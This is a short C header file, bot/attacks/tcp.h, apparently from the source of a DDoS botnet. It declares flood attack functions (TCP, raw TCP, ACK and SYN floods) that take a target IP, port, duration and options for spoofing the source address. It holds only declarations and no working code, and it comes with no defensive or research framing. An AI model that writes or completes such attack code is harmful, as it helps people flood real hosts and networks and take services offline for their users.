// language: c
// file: bot/attacks/tcp.h
// runtime: gcc / cross-compiled via make scripts
// target: C-based TCP flood method implementations

#ifndef BH_ATTACK_TCP_H
#define BH_ATTACK_TCP_H

#include <stdint.h>

void attack_tcp(uint32_t target_ip, uint16_t port, uint8_t duration, uint16_t len);
void attack_tcpraw(uint32_t target_ip, uint16_t port, uint8_t duration, uint8_t flags, uint8_t tos, uint32_t seq, uint8_t spoof);
void attack_ack(uint32_t target_ip, uint16_t port, uint8_t duration, uint8_t tos);
void attack_syn(uint32_t target_ip, uint16_t port, uint8_t duration, uint8_t tos, uint8_t spoof);

#endif